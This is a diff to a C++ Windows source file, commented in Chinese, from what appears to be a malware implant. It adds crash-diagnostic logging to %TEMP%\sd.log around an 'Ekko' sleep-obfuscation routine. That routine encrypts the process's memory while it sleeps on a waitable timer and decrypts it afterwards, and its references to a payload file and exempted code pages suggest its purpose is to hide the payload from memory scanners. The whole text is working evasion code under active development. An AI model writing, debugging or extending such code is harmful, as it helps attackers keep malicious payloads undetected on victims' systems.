@@ -11,6 +11,9 @@
 #include <cmath>
 #include <psapi.h>
 #include <intrin.h>
+// ★ BUILD 567 v3.238 DIAG: EkkoSleep 内部诊断日志所需
+#include <cstdio>
+#include <cstdarg>
 // ★ BUILD 496: 移除 <chrono> <random> — CRT 堆依赖
 
 #pragma comment(lib, "psapi.lib")
@@ -247,13 +250,59 @@ void SleepObfuscator::ObfuscatedSleep(DWORD milliseconds) {
     }
 }
 
+// ★ BUILD 567 v3.238 DIAG: EkkoSleep 内部诊断日志函数
+//   - 独立实现 (避免依赖 payload.cpp 的 DiagLog)
+//   - 紧邻 EkkoSleep 实现, 落入同一 4KB 页 (已被 exemptPages ekkoPage 豁免)
+//   - 写入 %TEMP%\sd.log (与 DiagLog 同文件, 共享时间戳格式)
+//   - FlushFileBuffers 强制落盘 (防止崩溃时缓存丢失)
+//   - 安全性: 仅在 EkkoSleep 入口/出口调用, 不在加密窗口内调用
+//              (EncryptAll 之后代码页加密, 调用任何函数都会执行加密代码 → 崩溃)
+static void EkkoDiagLog(const char* fmt, ...) {
+    char tsBuf[32];
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+    snprintf(tsBuf, sizeof(tsBuf), "[%02d:%02d:%02d.%03d] ",
+        st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
+    int tsLen = (int)strlen(tsBuf);
+
+    char buf[640];
+    memcpy(buf, tsBuf, tsLen);
+    va_list args;
+    va_start(args, fmt);
+    int len = vsnprintf(buf + tsLen, sizeof(buf) - tsLen, fmt, args);
+    va_end(args);
+    if (len < 0) len = 0;
+    if (len > (int)(sizeof(buf) - tsLen - 1)) len = (int)(sizeof(buf) - tsLen - 1);
+    len += tsLen;
+
+    wchar_t path[MAX_PATH];
+    GetTempPathW(MAX_PATH, path);
+    wcscat_s(path, MAX_PATH, L"sd.log");
+    HANDLE h = CreateFileW(path, FILE_APPEND_DATA, FILE_SHARE_READ, 0,
+                           OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+    if (h != INVALID_HANDLE_VALUE) {
+        DWORD w;
+        WriteFile(h, buf, (DWORD)len, &w, 0);
+        FlushFileBuffers(h);
+        CloseHandle(h);
+    }
+}
+
 void SleepObfuscator::EkkoSleep(DWORD milliseconds) {
     // Ekko 技术: 使用 WaitableTimer 替代 Sleep
     // 在计时器触发前加密内存, 触发后解密
 
+    // ★ BUILD 567 v3.238 DIAG: EkkoSleep 入口日志
+    //   若 "EA+ pre" 有 "EA+ post" 无 → EncryptAll 内部崩溃
+    //   若 "DA+ pre" 有 "DA+ post" 无 → DecryptAll 内部崩溃
+    EkkoDiagLog("B238:EK:enter ms=%u regions=%d\n",
+        (unsigned)milliseconds, m_regionCount);
+
     // ★ v3.125: 固定数组 m_regionCount
     if (m_regionCount == 0) {
+        EkkoDiagLog("B238:EK:no-regions fallback Sleep\n");
         Sleep(milliseconds);
+        EkkoDiagLog("B238:EK:exit (no-regions)\n");
         return;
     }
 
@@ -262,12 +311,18 @@ void SleepObfuscator::EkkoSleep(DWORD milliseconds) {
     //   直接使用 EncryptAll → WaitableTimer → DecryptAll 即可
 
     // ★ v3.37: EncryptAll/DecryptAll 已安全化 (检查 VirtualProtect 返回值)
+    // ★ BUILD 567 v3.238 DIAG: EncryptAll 前后日志
+    EkkoDiagLog("B238:EK:EA+ pre\n");
     EncryptAll();
+    EkkoDiagLog("B238:EK:EA+ post\n");
 
     HANDLE hWaitableTimer = CreateWaitableTimerW(nullptr, TRUE, nullptr);
     if (!hWaitableTimer) {
+        EkkoDiagLog("B238:EK:timer FAIL err=%u — fallback ObfuscatedSleep\n",
+            (unsigned)GetLastError());
         DecryptAll();  // 加密后必须解密, 否则内存处于损坏状态
         ObfuscatedSleep(milliseconds);
+        EkkoDiagLog("B238:EK:exit (fallback)\n");
         return;
     }
 
@@ -277,9 +332,14 @@ void SleepObfuscator::EkkoSleep(DWORD milliseconds) {
 
     WaitForSingleObject(hWaitableTimer, INFINITE);
 
+    // ★ BUILD 567 v3.238 DIAG: DecryptAll 前后日志
+    //   若 pre 有 post 无 → DecryptAll 内部崩溃 (代码页保持加密)
+    EkkoDiagLog("B238:EK:DA+ pre\n");
     DecryptAll();
+    EkkoDiagLog("B238:EK:DA+ post\n");
 
     CloseHandle(hWaitableTimer);
+    EkkoDiagLog("B238:EK:exit (normal)\n");
 }
 
 void SleepObfuscator::FoliageSleep(DWORD milliseconds) {
